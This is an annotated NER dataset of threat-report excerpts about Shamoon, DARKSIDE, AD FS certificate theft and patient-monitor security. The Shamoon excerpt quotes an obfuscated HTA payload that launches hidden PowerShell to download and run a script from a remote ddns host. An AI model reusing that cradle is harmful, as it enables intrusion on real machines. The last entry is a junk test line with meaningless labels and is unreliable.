[
    [
        "By Thomas Roccia , Jessica Saavedra-Morales and Christiaan Beek on Dec 19, 2018 Last week the McAfee Advanced Threat Research team posted an analysis of a new wave of Shamoon “wiper” malware attacks that struck several companies in the Middle East and Europe.\nIn that analysis we discussed one difference to previous Shamoon campaigns.\nThe latest version has a modular approach that allows the wiper to be used as a standalone threat.\nAfter further analysis of the three versions of Shamoon and based on the evidence we describe here, we conclude that the Iranian hacker group APT33—or a group masquerading as APT33—is likely responsible for these attacks.",
        {
            "entities": [
                [
                    "Malware_Type",
                    176,
                    181
                ],
                [
                    "Malware_Name",
                    167,
                    174
                ],
                [
                    "Malware_Name",
                    318,
                    325
                ],
                [
                    "Malware_Name",
                    486,
                    493
                ],
                [
                    "Threat_Actor",
                    580,
                    585
                ],
                [
                    "Threat_Actor",
                    613,
                    618
                ]
            ]
        }
    ],
    [
        "\nIn the Shamoon attacks of 2016–2017, the adversaries used both the Shamoon Version 2 wiper and the wiper Stonedrill.\nIn the 2018 attacks, we find the Shamoon Version 3 wiper as well as the wiper Filerase, first mentioned by Symantec .\nThese new wiper samples (Filerase) differ from the Shamoon Version 3, which we analyzed last week.\nThe latest Shamoon appears to be part of a toolkit with several modules.\nWe identified the following modules: OCLC.exe: Used to read a list of targeted computers created by the attackers.\nThis tool is responsible to run the second tool, spreader.exe, with the list of each targeted machine.\nSpreader.exe: Used to spread the file eraser in each machine previously set.\nIt also gets information about the OS version.\nSpreaderPsexec.exe:\nSimilar to spreader.exe but uses psexec.exe to remotely execute the wiper.\nSlHost.exe:\nThe new wiper, which browses the targeted system and deletes every file.\nThe attackers have essentially packaged an old version (V2) of Shamoon with an unsophisticated toolkit coded in .Net.",
        {
            "entities": [
                [
                    "Malware_Name",
                    9,
                    16
                ],
                [
                    "Malware_Name",
                    69,
                    76
                ],
                [
                    "Version_Tag",
                    77,
                    86
                ],
                [
                    "Malware_Name",
                    107,
                    117
                ],
                [
                    "Malware_Type",
                    87,
                    92
                ],
                [
                    "Malware_Type",
                    101,
                    106
                ],
                [
                    "Version_Tag",
                    161,
                    170
                ],
                [
                    "Malware_Name",
                    153,
                    160
                ],
                [
                    "Malware_Name",
                    198,
                    206
                ],
                [
                    "Malware_Type",
                    171,
                    176
                ],
                [
                    "Malware_Type",
                    192,
                    197
                ],
                [
                    "Malware_Type",
                    249,
                    254
                ],
                [
                    "Malware_Name",
                    264,
                    272
                ],
                [
                    "Malware_Name",
                    290,
                    297
                ],
                [
                    "Version_Tag",
                    298,
                    307
                ],
                [
                    "Malware_Name",
                    350,
                    357
                ],
                [
                    "Tool",
                    450,
                    458
                ],
                [
                    "Tool",
                    578,
                    590
                ],
                [
                    "Tool",
                    633,
                    645
                ],
                [
                    "Tool",
                    759,
                    777
                ],
                [
                    "Tool",
                    813,
                    823
                ],
                [
                    "Tool",
                    856,
                    866
                ],
                [
                    "Malware_Type",
                    877,
                    882
                ],
                [
                    "Version_Tag",
                    999,
                    1001
                ],
                [
                    "Malware_Name",
                    1006,
                    1013
                ]
            ]
        }
    ],
    [
        "\nThis suggests that multiple developers have been involved in preparing the malware for this latest wave of attacks.\nIn our last post, we observed that Shamoon is a modular wiper that can be used by other groups.\nWith these recent attacks, this supposition seems to be confirmed.\nWe have learned that the adversaries prepared months in advance for this attack, with the wiper execution as the goal.\nThis post provides additional insight about the attack and a detailed analysis of the .Net tool kit.",
        {
            "entities": [
                [
                    "Malware_Name",
                    154,
                    161
                ],
                [
                    "Malware_Type",
                    175,
                    180
                ]
            ]
        }
    ],
    [
        "\nGeopolitical context The motivation behind the attack is still unclear.\nShamoon Version 1 attacked just two targets in the Middle East.\nShamoon Version 2 attacked multiple targets in Saudi Arabia.\nVersion 3 went after companies in the Middle East by using their suppliers in Europe, in a supply chain attack.\nInside the .Net wiper, we discovered the following ASCII art: These characters resemble the Arabic text تَبَّتْ يَدَا",
        {
            "entities": [
                [
                    "Malware_Name",
                    75,
                    82
                ],
                [
                    "Version_Tag",
                    83,
                    92
                ],
                [
                    "Malware_Name",
                    140,
                    147
                ],
                [
                    "Version_Tag",
                    148,
                    157
                ],
                [
                    "Version_Tag",
                    202,
                    211
                ]
            ]
        }
    ],
    [
        "\nأَبِي لَهَبٍ وَتَبَّ.\nThis is a phrase from the Quran (Surah Masad, Ayat 1 [111:1]) that means “perish the hands of the Father of flame” or “the power of Abu Lahab will perish, and he will perish.”\nWhat does this mean in the context of a cyber campaign targeting energy industries in the Middle East?\nOverview of the attack How did the malware get onto the victim’s network?\nWe received intelligence that the adversaries had created websites closely resembling legitimate domains which carry job offerings.\nFor example: Hxxp://possibletarget.ddns.com:880/JobOffering.\nMany of the URLs we discovered were related to the energy sector operating mostly in the Middle East.\nSome of these sites contained malicious HTML application files that execute other payloads.\nOther sites lured victims to login using their corporate credentials.\nThis preliminary attack seems to have started by the end of August 2018, according to our telemetry, to gather these credentials.\nA code example from one malicious HTML application file: YjDrMeQhBOsJZ =\n“WS”\nwcpRKUHoZNcZpzPzhnJw =\n“crip” RulsTzxTrzYD = “t.Sh” MPETWYrrRvxsCx =\n“ell” PCaETQQJwQXVJ =\n(YjDrMeQhBOsJZ + wcpRKUHoZNcZpzPzhnJw + RulsTzxTrzYD + MPETWYrrRvxsCx) OoOVRmsXUQhNqZJTPOlkymqzsA=new ActiveXObject(PCaETQQJwQXVJ)\nULRXZmHsCORQNoLHPxW = “cm” zhKokjoiBdFhTLiGUQD =\n“d.e” KoORGlpnUicmMHtWdpkRwmXeQN = “xe” KoORGlpnUicmMHtWdp = “.”\nKoORGlicmMHtWdp = “(‘http://mynetwork.ddns.net:880/*****.ps1’) OoOVRmsXUQhNqZJTPOlkymqzsA.run(‘%windir%\\\\\\\\System32\\\\\\\\’ + FKeRGlzVvDMH + ‘ /c\npowershell -w 1 IEX (New-Object Net.WebClient)’+KoORGlpnUicmMHtWdp+’downloadstring’+KoORGlicmMHtWdp) OoOVRmsXUQhNqZJTPOlkymqzsA.run(‘%windir%\\\\\\\\System32\\\\\\\\’ + FKeRGlzVvDMH + ‘ /c powershell -window hidden -enc",
        {
            "entities": []
        }
    ],
    [
        "Update (May 14):\n Mandiant has observed multiple actors cite a May 13 announcement that appeared to be shared with DARKSIDE RaaS affiliates by the operators of the service.\nThis announcement stated that they lost access to their infrastructure, including their blog, payment, and CDN servers, and would be closing their service.\nDecrypters would also be provided for companies who have not paid, possibly to their affiliates to distribute.\nThe post cited law enforcement pressure and pressure from the United States for this decision.\nWe have not independently validated these claims and there is some speculation by other actors that this could be an exit scam.",
        {
            "entities": [
                [
                    "Malware_Name",
                    116,
                    124
                ]
            ]
        }
    ],
    [
        "\nBackground Since initially surfacing in August 2020, the creators of DARKSIDE ransomware and their affiliates have launched a global crime spree affecting organizations in more than 15 countries and multiple industry verticals.\nLike many of their peers, these actors conduct multifaceted extortion where data is both exfiltrated and encrypted in place, allowing them to demand payment for unlocking and the non-release of stolen data to exert more pressure on victims.",
        {
            "entities": [
                [
                    "Malware_Name",
                    71,
                    79
                ],
                [
                    "Malware_Type",
                    80,
                    90
                ]
            ]
        }
    ],
    [
        "\nThe origins of these incidents are not monolithic.\nDARKSIDE ransomware operates as a ransomware-as-a-service (RaaS) wherein profit is shared between its owners and partners, or affiliates, who provide access to organizations and deploy the ransomware.\nMandiant currently tracks multiple threat clusters that have deployed this ransomware, which is consistent with multiple affiliates using DARKSIDE.\nThese clusters demonstrated varying levels of technical sophistication throughout intrusions.\nWhile the threat actors commonly relied on commercially available and legitimate tools to facilitate various stages of their operations, at least one of the threat clusters also employed a now patched zero-day vulnerability.",
        {
            "entities": [
                [
                    "Malware_Name",
                    54,
                    62
                ],
                [
                    "Malware_Type",
                    63,
                    73
                ],
                [
                    "Malware_Type",
                    331,
                    341
                ],
                [
                    "Malware_Name",
                    394,
                    402
                ]
            ]
        }
    ],
    [
        "\nReporting on DARKSIDE has been available in advance of this blog post to users of Mandiant Advantage Free , a no-cost version of our threat intelligence platform.\nTargeting Mandiant has identified multiple DARKSIDE victims through our incident response engagements and from reports on the DARKSIDE blog.\nMost of the victim organizations were based in the United States and span across multiple sectors, including financial services, legal, manufacturing, professional services, retail, and technology.\nThe number of publicly named victims on the DARKSIDE blog has increased overall since August 2020, with the exception of a significant dip in the number of victims named during January 2021 (Figure 1).\nIt is plausible that the decline in January was due to threat actors using DARKSIDE taking a break during the holiday season.\nThe overall growth in the number of victims demonstrates the increasing use of the DARKSIDE ransomware by multiple affiliates.\nFigure 1: Known DARKSIDE victims (August 2020 to April 2021)\nDARKSIDE Ransomware Service Beginning in November 2020, the Russian-speaking actor \\\"darksupp\\\" advertised DARKSIDE RaaS on the Russian-language forums exploit.in and xss.is.",
        {
            "entities": [
                [
                    "Malware_Name",
                    15,
                    23
                ],
                [
                    "Malware_Name",
                    209,
                    217
                ],
                [
                    "Software_Name",
                    84,
                    107
                ],
                [
                    "Malware_Name",
                    292,
                    300
                ],
                [
                    "Malware_Name",
                    551,
                    559
                ],
                [
                    "Malware_Name",
                    785,
                    793
                ],
                [
                    "Malware_Name",
                    920,
                    928
                ],
                [
                    "Malware_Type",
                    929,
                    939
                ],
                [
                    "Malware_Name",
                    981,
                    989
                ],
                [
                    "Malware_Name",
                    1027,
                    1035
                ],
                [
                    "Malware_Type",
                    1036,
                    1046
                ],
                [
                    "Malware_Name",
                    1134,
                    1142
                ],
                [
                    "Threat_Actor",
                    1112,
                    1120
                ]
            ]
        }
    ],
    [
        "\nIn April 2021, darksupp posted an update for the \\\"Darkside 2.0\\\" RaaS that included several new features and a description of the types of partners and services they were currently seeking (Table 1).\nAffiliates retain a percentage of the ransom fee from each victim.\nBased on forum advertisements, the RaaS operators take 25% for ransom fees less than $500,000, but this decreases to 10 percent for ransom fees greater than $5 million.",
        {
            "entities": [
                [
                    "Threat_Actor",
                    17,
                    25
                ],
                [
                    "Version_Tag",
                    62,
                    65
                ],
                [
                    "Malware_Name",
                    53,
                    61
                ]
            ]
        }
    ],
    [
        "Organizations are increasingly adopting cloud-based services such as Microsoft 365 to host applications and data.\nSophisticated threat actors are catching on and Mandiant has observed an increased focus on long-term persistent access to Microsoft 365 as one of their primary objectives.\nThe focus on developing novel and hard to detect methods to achieve this goal was highlighted with the recent detection of UNC2452 and their access to Microsoft 365 .\nOne of this group's key TTPs was to steal the Token Signing Certificate from an organization’s AD FS server to enable them to bypass MFA and access cloud services as any user, at any time.\nWhile defenders previously associated the defense of this certificate, and thus the entire ecosystem, with careful access control and detection efforts around the AD FS server and service account, this is no longer sufficient.\nIn this blog post we will show how a threat actor, with the right privilege, can extract the encrypted Token Signing Certificate from anywhere on the internal network.",
        {
            "entities": [
                [
                    "Software_Name",
                    69,
                    82
                ],
                [
                    "Software_Name",
                    238,
                    251
                ],
                [
                    "Threat_Actor",
                    412,
                    419
                ],
                [
                    "Software_Name",
                    440,
                    453
                ]
            ]
        }
    ],
    [
        "\nOnce extracted, a threat actor can easily decrypt it and begin accessing cloud services.\nActive Directory Federation Services Active Directory Federation Services (AD FS) is a feature for Windows Servers that enables federated identity and access management .\nIt is often used by organizations to provide single sign-on functionality to access enterprise applications such as Microsoft 365.\nIn technical terms, AD FS functions as an Identity Provider (IdP) and Microsoft 365 is a Service Provider (SP).\nWe’ll use Microsoft 365 as an example going forward, but this technique could apply to any service that is set up to trust AD FS.",
        {
            "entities": [
                [
                    "Software_Name",
                    380,
                    393
                ],
                [
                    "Software_Name",
                    466,
                    479
                ],
                [
                    "Software_Name",
                    519,
                    532
                ]
            ]
        }
    ],
    [
        "\nAD FS verifies a user’s identity and issues assertions that describe the user.\nMicrosoft 365  trusts AD FS to verify user identities and provide it with assertions.\nTo Microsoft 365, it doesn’t matter how AD FS performed the verification, it just needs the assertions.\nIn the typical deployment (Figure 1), AD FS will verify a user’s identity using Active Directory.\nAt a minimum, an AD FS deployment consists of two servers in an enterprise’s on-premises network: the primary AD FS server, and an AD FS Web Application Proxy (WAP).",
        {
            "entities": [
                [
                    "Software_Name",
                    82,
                    95
                ],
                [
                    "Software_Name",
                    172,
                    185
                ]
            ]
        }
    ],
    [
        "\nThe proxy is placed in the DMZ and has no functionality besides proxying sign-on attempts from the Internet to the AD FS server.\nThe primary AD FS server receives proxied requests, verifies a user’s identity, and issues assertions that are packaged into SAML security tokens for the user.",
        {
            "entities": []
        }
    ],
    [
        "\nFigure 1: Typical AD FS deployment (source: Microsoft )\nThe SAML token issued by AD FS proves a user’s identity to Microsoft 365 and can also be used to make authorization decisions.\nThe SAML token is an XML document with two main components: Assertions : Assertions are XML elements that describe the user’s identity.\nAn assertion could be a user SID, group membership SIDs, or other elements like the user’s department name.\nA single SAML token can have multiple assertions attached to it.\nDigital Signature : The assertions in the SAML token are digitally signed using a public/private keypair that resides on the AD FS server.",
        {
            "entities": [
                [
                    "Software_Name",
                    118,
                    131
                ]
            ]
        }
    ],
    [
        "By Douglas McKee on Aug 11, 2018\nThe author thanks Shaun Nordeck, MD, for his assistance with this report.\nWith the explosion of growth in technology and its influence on our lives, we have become increasingly dependent on it.\n The medical field is no exception: Medical professionals trust technology to provide them with accurate information and base life-changing decisions on this data.\nMcAfee’s Advanced Threat Research team is exploring these devices to increase awareness about their security.\nSome medical devices, such as pacemakers and insulin pumps, have already been examined for security concerns.\nTo help select an appropriate target for our research, we spoke with a doctor.\nIn our conversations we learned just how important the accuracy of a patient’s vital signs is to medical professionals.",
        {
            "entities": []
        }
    ],
    [
        "\n“Vital signs are integral to clinical decision making” explained Dr. Shaun Nordeck.\nBedside patient monitors and related systems are key components that provide medical professionals with the vital signs they need to make decisions; these systems are now the focal point of this research.\nExploring the attack surface Most patient monitoring systems comprise at minimum of two basic components: a bedside monitor and a central monitoring station.\nThese devices are wired or wirelessly networked over TCP/IP.\nThe central monitoring station collects vitals from multiple bedside monitors so that a single medical professional can observe multiple patients.",
        {
            "entities": [
                [
                    "Protocol",
                    505,
                    508
                ],
                [
                    "Protocol",
                    509,
                    511
                ]
            ]
        }
    ],
    [
        "\nWith the help of eBay, we purchased both a patient monitor and a compatible central monitoring station at a reasonable cost.\nThe patient monitor monitored heartbeat, oxygen level, and blood pressure.\nIt has both wired and wireless networking and appeared to store patient information.\nThe central monitoring station ran Windows XP Embedded, with two Ethernet ports, and ran in a limited kiosk mode at start-up.\nBoth units were produced around 2004; several local hospitals confirmed that these models are still in use.\nThe two devices offer a range of potential attack surfaces.\nThe central monitoring station operates fundamentally like a desktop computer running Windows XP, which has been extensively researched by the security community.\nThe application running on the central monitoring station is old; if we found a vulnerability, it would likely be tied to the legacy operating system.",
        {
            "entities": [
                [
                    "Operating_System",
                    325,
                    335
                ],
                [
                    "Operating_System",
                    673,
                    683
                ]
            ]
        }
    ],
    [
        "\nThe patient monitor’s firmware could be evaluated for vulnerabilities; however, this would affect only one of the two devices in the system and is the hardest vector to exploit.\nThis leaves the communication between the two devices as the most interesting attack vector since if the communication could be compromised, an attack could possibly be device independent, affecting both devices by a remote attack.\nGiven this possibility, we chose networking as the first target for this research.\nDr. Nordeck confirmed that if the information passing to the central monitoring system could be modified in real time, this would be a meaningful and valid concern to medical professionals.",
        {
            "entities": []
        }
    ],
    [
        "\nThus the primary question of our research became “Is it possible in real time to modify a patient’s vitals being transmitted over the network?”\nSetup When performing a vulnerability assessment of any device, it is best to first operate the device as originally designed.\nTracking vital signs is the essence of the patient monitor, so we looked for a way to accurately simulate those signs for testing.",
        {
            "entities": []
        }
    ],
    [
        "Hey guys\nThis is a test\nTo see some stuff",
        {
            "entities": [
                [
                    "Todd",
                    0,
                    3
                ],
                [
                    "Todd",
                    4,
                    8
                ],
                [
                    "Todd",
                    10,
                    14
                ],
                [
                    "Todd",
                    15,
                    17
                ],
                [
                    "Todd",
                    38,
                    43
                ]
            ]
        }
    ]
]